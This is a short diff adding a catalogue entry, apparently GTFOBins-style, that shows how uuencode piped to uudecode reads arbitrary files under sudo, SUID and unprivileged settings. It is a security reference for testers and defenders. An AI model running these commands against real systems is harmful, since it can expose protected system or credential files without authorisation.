@@ -1,0 +1,14 @@
+uuencode
+========
+
+File read
+---------
+
+[Sudo]
+    uuencode /path/to/input-file /dev/stdout | uudecode
+
+[SUID]
+    uuencode /path/to/input-file /dev/stdout | uudecode
+
+[Unprivileged]
+    uuencode /path/to/input-file /dev/stdout | uudecode
